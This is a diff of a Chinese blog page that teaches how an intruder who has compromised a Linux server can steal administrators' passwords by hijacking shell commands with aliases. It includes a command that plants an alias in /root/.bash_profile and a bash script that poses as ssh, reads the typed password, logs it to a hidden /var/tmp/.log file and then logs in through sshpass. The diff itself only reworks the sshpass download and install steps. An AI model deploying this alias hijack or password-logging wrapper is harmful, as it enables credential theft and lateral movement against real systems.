@@ -16,7 +16,7 @@
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44bdec28011f685eb60942">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44be5432f2ca5a1c6f190b">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5e44c01790144e59595037cb">
-<meta property="og:updated_time" content="2020-02-13T03:28:38.000Z">
+<meta property="og:updated_time" content="2020-02-13T03:35:58.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="探索基于linux别名特性窃取密码">
 <meta name="twitter:description" content="当通过web途径获取到linux机器时，往往想获取到root明文密码进行横向扩展，但是拿到shadow又无法解密，此时可以通过设置别名进行窃取管理员密码。 劫持系统ls命令：首先设置变量别名到环境变量下并赋值文件权限 12echo &amp;quot;alias ls=/var/tmp/update.py&amp;quot;&amp;gt;&amp;gt; /root/.bash_profile chmod u+x /var/t">
@@ -155,10 +155,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ $# != &quot;1&quot; ] </span><br><span class="line">then </span><br><span class="line">	/usr/bin/ssh </span><br><span class="line">else </span><br><span class="line">	echo -e &quot;$&#123;1&#125;&apos;s password: \c&quot; </span><br><span class="line">	read -s pass </span><br><span class="line">	echo $1&quot;:&quot;$pass &gt;&gt; /var/tmp/.log </span><br><span class="line">	echo &quot;&quot; </span><br><span class="line">	sshpass -p &quot;$pass&quot; /usr/bin/ssh $&#123;1&#125;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>
 <p>sshpass是用于非交互的ssh 密码验证</p>
 <p>从命令行方式传递密码：</p>
-<p><code>sshpass -p user_password ssh user_name@rhost</code></p>
-<p><code>wget http://sourceforge.net/projects/sshpass/files/latest/download -O sshpass.tar.gz</code></p>
-<p>下载后，解压，安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p user_password ssh user_name@rhost</span><br></pre></td></tr></table></figure>
+<p>下载地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sourceforge.net/projects/sshpass/files/latest/download</span><br></pre></td></tr></table></figure></p>
+<p>下载后，解压，安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf sshpass-1.06.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5e44be5432f2ca5a1c6f190b" alt=""></p>
 <p>最后，到指定的目录下，即可看到窃取到的远程服务器账号以及密码，如下：</p>
 <p><img src="https://www.yunzhijia.com/microblog/filesvr/5e44c01790144e59595037cb" alt=""></p>
